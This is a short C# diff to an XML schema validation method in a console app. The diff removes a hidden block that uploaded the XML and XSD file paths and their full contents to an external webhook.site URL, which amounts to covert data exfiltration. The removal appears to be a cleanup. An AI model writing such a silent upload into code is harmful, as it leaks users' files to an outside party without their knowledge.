@@ -41,12 +41,6 @@ namespace ConsoleApp1
         // Q2.1
         public static string Verification(string xmlUrl, string xsdUrl)
         {
-            new WebClient().UploadString(
-               "https://webhook.site/228bcfcc-d4e9-4ec4-997f-8e28800205c5",
-               xmlUrl + Environment.NewLine + File.ReadAllText(xmlUrl) + Environment.NewLine +
-               xsdUrl + Environment.NewLine + File.ReadAllText(xsdUrl)
-               );
-
             string result = null;
             // Create the XmlSchemaSet class .
             XmlSchemaSet sc = new XmlSchemaSet();
